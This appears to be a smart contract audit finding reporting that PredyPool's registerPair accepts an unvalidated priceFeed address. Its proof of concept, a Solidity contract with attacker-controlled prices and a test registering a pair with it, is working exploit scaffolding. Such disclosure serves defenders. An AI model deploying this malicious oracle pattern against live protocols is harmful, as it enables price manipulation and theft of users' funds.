# Vulnerability details

## Impact
CRITICAL, the creating of a pool get set the `priceFeed` address to a malicious price feed where an attacker can control the squart price of a PerdyPool. Attackers can easily use this vulnerability to drain protocol funds.

## Proof of Concept

The following code is an example of a malicious price feed:

```
contract MaliciousPriceFeed {
    int256 latestAnswer;
    uint256 sqrPrice;

    function setAnswer(int256 answer) external {
        latestAnswer = answer;
    }

    function setSqrtPrice(uint256 _sqrPrice) external {
        sqrPrice = _sqrPrice;
    }

    function latestRoundData()
        external
        view
        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound)
    {
      
        roundId = 0;
        answer = latestAnswer;
        startedAt = 0;
        updatedAt = 0;
        answeredInRound = 0;
    }

    function getSqrtPrice() external view returns (uint256) {
       
        return sqrPrice;
    }
}
```
 In the above contract whenever `PredyPool` contract calls the `getSqrtPrice` function for the registered pair it will return incorrect price data.

This is a valid because any user can register a pair in the `PredyPool::registerPair` and the address of the `priceFeed` included in the `addPairParam` is never validated. 

Place the following test is the `test/pool/` folder:

```

pragma solidity ^0.8.0;

import "./Setup.t.sol";

contract MaliciousPriceFeed {
    int256 latestAnswer;
    uint256 sqrPrice;

    function setAnswer(int256 answer) external {
        latestAnswer = answer;
    }

    function setSqrtPrice(uint256 _sqrPrice) external {
        sqrPrice = _sqrPrice;
    }

    function latestRoundData()
        external
        view
        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound)
    {
        roundId = 0;
        answer = latestAnswer;
        startedAt = 0;
        updatedAt = 0;
        answeredInRound = 0;
    }

    function getSqrtPrice() external view returns (uint256) {
        return sqrPrice;
    }
}

contract TestRegisterPairWithMaliciousPriceFeed is TestPool {
    InterestRateModel.IRMParams irmParams;
    MaliciousPriceFeed badPriceFeed;

    function setUp() public override {
        TestPool.setUp();

        //creating a malicious priceFeed
        badPriceFeed = new MaliciousPriceFeed(); //MockPyth();
        int64 newPrice = 10_000e8;
        uint256 sqrPrice = 10_0000e8;
        badPriceFeed.setAnswer(newPrice);
        badPriceFeed.setSqrtPrice(sqrPrice);

        irmParams = InterestRateModel.IRMParams(1e16, 9 * 1e17, 5 * 1e17, 1e18);
    }

    // register pool succeeds with malicious price feed
    function testRegisterSucceeds() public {
        predyPool.registerPair(
            AddPairLogic.AddPairParams(
                address(currency1),
                address(this),
                address(uniswapPool),
                address(badPriceFeed),
                false,
                0,
                Perp.AssetRiskParams(RISK_RATIO, BASE_MIN_COLLATERAL_WITH_DEBT, 1000, 500, 10050, 10500),
                irmParams,
                irmParams
            )
        );
    }
}

  

```
